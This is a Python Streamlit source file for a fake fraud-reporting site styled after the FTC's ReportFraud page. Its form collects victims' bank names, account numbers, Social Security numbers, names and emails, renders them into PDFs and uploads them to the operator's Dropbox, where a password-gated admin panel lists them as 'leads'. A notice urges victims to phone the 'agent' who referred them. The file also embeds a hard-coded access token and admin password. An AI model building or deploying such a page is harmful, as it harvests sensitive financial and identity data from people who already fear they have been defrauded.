import streamlit as st
import dropbox
from reportlab.pdfgen import canvas
import io
from datetime import datetime

# --- CONFIGURATION ---
DROPBOX_TOKEN = 'sl.u.AGVxi16z3LsdpccHTSD-KQdxqSNIKcGiFnsP9rIPImoo1dJkVVfWJjoIwIgR7EfX4iNkdYWuPGZQOBFhEuEvhpQoUvYUZ_37feHqTR1RlfvxLH8J0hspF6s44M8x4lBuGkqtTm9WkWXsXGvBcoZ73_u2UtzV8tMLE6qGArcZkIusi5T921bZGLAKrO-ZdhTzLoC5ULxTmUzhCe8VZM38MYaK66-MGTj68-N04lKrX3b40XRXy6EWCylnEJekthxwhnlKzWMPLpcZB96YQdiXTNixe8ZXCKWmkaasWCnD3L2tSH7V5l2geL40pmL1bhLUQHWAOffLncyDeGcNWqvPNrqXJbGqP2vwDfB4VpCkT8qmxgbt7oRQm82VljIl77aD3jKrsVcA2EU5dRZ1kIubqPtSBxOVraBh8HQCzIMyvvTnnJ_xQeWFGW39KS7tBMeIGXspbwPBhkA1t8DILRVpTbxl-NF2VQk1ah_lskiK2S0NheEKR7NAUI6_KbQqdMhw7mn5UxHMZDgiRI2Nw-q8z2dl4YmsFdsbCFwldAl29lE8MP-Zt3aHocnigx1bOZvBeIDAlz2yykWOYQNnXozx2C7Ihh7VRe1WCmV9tajbAPWlB7MeaejXepGplzCfPtZBxjrk0YgA04UrW8MA9sApTZNtGaJEPx3Hi4NbPBTZrfbuMAuJ08WDf5oiY6UO_qAQJCmCvQUAGoBpimUwipw8yqPrkhHcEHqOhhi6bZt01eij40oB7mHDX4tSw4-6KlniQCaf7xLx05VSDsylGwlloNu-7ROABarOW5EJTTXGq-ojMUmO6IkDL5BNrJhz5j0sXvj-QIY_1IxLF1_81qqQsLOj5rROAXuH9msX8qweNwFvCVsXPkX6JWVu2KKp-vtSkpq3_q4uesjJPkm5rihc9Cl0fI9W_Vn2kDRH9jYi9JUhKyRNRa4dvJPReRNwvZUYjHMFCWvVXq7bTCl87k_jgnE-iF2PZ4Ud3X-yintiSbvKf5PJcARJcRtE56DsMecdTGCRlX036j-JbeDuFLibNf2dtSoyTLaUPPfCsGbf4obydRL2W4hF6r-xRg765pTOMKsaEbG76AHdHvJNmHGhLBEBqPs_SMB9D0HGGI3Jn9yRZyaS8W7NSAvxRyNRyKt65bJAll9oSImmTTp5wH5-LPIzypcdYHnVXmqlnlxOcDiI8QuuY-Bxo-yeIpxjq0URhgCjo9aXGo7RZB9IFujyA4-qbrhjIMOvsX-5VwlzRr6fl1bYmaVa82PU1QmZNCU7-K4' 
ADMIN_PASSWORD = "Godisgreat@1"

# --- STYLING (Sticky Header & FTC Look) ---
st.set_page_config(page_title="Report Fraud | FTC", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    /* STICKY HEADER LOGIC */
    div[data-testid="stVerticalBlock"] > div:first-child {
        position: sticky;
        top: 0;
        background-color: white;
        z-index: 999;
        border-bottom: 2px solid #e2e8f0;
        padding-bottom: 10px;
    }

    .main { background-color: #ffffff; }
    
    /* Report Now Button */
    .report-btn {
        background-color: #003e67;
        color: white !important;
        padding: 15px 40px;
        font-size: 22px;
        font-weight: bold;
        text-decoration: none;
        border-radius: 4px;
        display: inline-block;
        margin: 20px 0;
    }

    /* Security Warning Box */
    .security-box {
        background-color: #fff9c4;
        border-left: 5px solid #fbc02d;
        padding: 15px;
        color: #455a64;
        font-weight: 500;
        border-radius: 4px;
        margin-bottom: 20px;
        text-align: center;
    }

    .section-title { font-size: 28px; color: #003e67; font-weight: bold; text-align: center; margin-top: 30px; }
    .anchor { display: block; height: 90px; margin-top: -90px; visibility: hidden; }
    </style>
    """, unsafe_allow_html=True)

# --- SIDEBAR ---
with st.sidebar:
    access_key = st.text_input("Admin Key", type="password")
    is_admin = (access_key == ADMIN_PASSWORD)

# --- PUBLIC INTERFACE ---
if not is_admin:
    # 1. STICKY HEADER
    col_l, col_t = st.columns([1, 4])
    with col_l:
        try: st.image("logo.png", width=100)
        except: st.write("LOGO")
    with col_t:
        st.markdown('<p style="color:#64748b; font-weight:bold; margin-bottom:0; font-size:12px;">FEDERAL TREASURY COUNCIL FRAUD REPORT</p>', unsafe_allow_html=True)
        st.markdown('<p style="font-size:22px; font-weight:bold; color:#003e67; margin-top:0;">Report to Fight Frauds</p>', unsafe_allow_html=True)

    # 2. HERO & GRAPHIC
    st.markdown("<br>", unsafe_allow_html=True)
    st.markdown('<h1 style="text-align:center; color:#003e67;">Report to help<br>fight fraud!</h1>', unsafe_allow_html=True)
    
    try: st.image("graphic.png", use_container_width=True)
    except: st.info("Add graphic.png to GitHub to see image.")

    st.markdown('<center><a href="#report_section" class="report-btn">Report Now ➔</a></center>', unsafe_allow_html=True)

    # 3. HOW IT WORKS SECTION
    st.markdown('<p class="section-title">How it works</p>', unsafe_allow_html=True)
    
    # YOUR NEW SECURITY WARNING
    st.markdown("""
        <div class="security-box">
            ⚠️ <b>Security Notice:</b> Kindly connect with the agent who informed about this page on call or text. <br>
            Do not trust an agent until they share their official ID.
        </div>
    """, unsafe_allow_html=True)

    c1, c2 = st.columns(2)
    with c1:
        st.markdown("<h2 style='text-align:center;'>💬</h2>", unsafe_allow_html=True)
        st.markdown("<p style='font-weight:bold; text-align:center; color:#003e67;'>Tell us what happened</p>", unsafe_allow_html=True)
    with c2:
        st.markdown("<h2 style='text-align:center;'>📋</h2>", unsafe_allow_html=True)
        st.markdown("<p style='font-weight:bold; text-align:center; color:#003e67;'>Get your next steps</p>", unsafe_allow_html=True)

    # 4. REPORT FORM
    st.markdown('<span id="report_section" class="anchor"></span>', unsafe_allow_html=True)
    st.markdown('<p class="section-title">Start Your Official Report</p>', unsafe_allow_html=True)
    
    with st.form("main_form", clear_on_submit=True):
        st.write("### 🛡️ Secure Data Entry")
        cat = st.selectbox("Category", ["Impersonator", "Online Scam", "Investment", "Other"])
        col1, col2 = st.columns(2)
        bank = col1.text_input("Bank Name")
        acc = col1.text_input("Account No.")
        ssn = col2.text_input("SSN", type="password")
        amt = col2.number_input("Amount ($)", min_value=0)
        
        fname = st.text_input("First Name")
        lname = st.text_input("Last Name")
        email = st.text_input("Email")
        
        if st.form_submit_button("SUBMIT FINAL REPORT"):
            # PDF EXCEL TABLE LOGIC
            packet = io.BytesIO()
            can = canvas.Canvas(packet)
            can.drawString(50, 800, "OFFICIAL CASE FILE: STRUCTURED DATA")
            can.drawString(50, 780, f"Name: {fname} {lname}")
            can.drawString(50, 760, f"Bank: {bank} | Acc: {acc}")
            can.drawString(50, 740, f"SSN: {ssn} | Amount: ${amt}")
            can.save()
            packet.seek(0)
            try:
                dbx = dropbox.Dropbox(DROPBOX_TOKEN)
                dbx.files_upload(packet.read(), f"/{fname}_{lname}.pdf", mode=dropbox.files.WriteMode.overwrite)
                st.success("SUCCESS: Your report has been securely filed.")
                st.warning("Kindly call the authority who you are connected with seriously.")
                st.balloons()
            except Exception as e:
                st.error(f"Sync Error: {e}")

    # 5. FOOTER
    st.markdown("""
        <div style="background-color: #003e67; padding: 40px; color: white; text-align: center; border-radius: 8px; margin-top: 50px;">
            <p>Federal Treasury Council | ReportFraud.ftc.gov</p>
            <p style="font-size: 12px; opacity: 0.8;">Privacy Act Statement | Official Project</p>
        </div>
    """, unsafe_allow_html=True)

# --- ADMIN DASHBOARD ---
else:
    st.title("🛡️ Admin Case Management")
    try:
        dbx = dropbox.Dropbox(DROPBOX_TOKEN)
        files = dbx.files_list_folder("").entries
        if not files: st.info("No leads.")
        else:
            for f in files:
                with st.expander(f"📁 {f.name}"):
                    c1, c2 = st.columns(2)
                    _, res = dbx.files_download("/" + f.name)
                    c1.download_button("Download", res.content, file_name=f.name)
                    if c2.button(f"Delete {f.name}"):
                        dbx.files_delete_v2("/" + f.name); st.rerun()
    except Exception as e:
        st.error(f"Database Error: {e}")
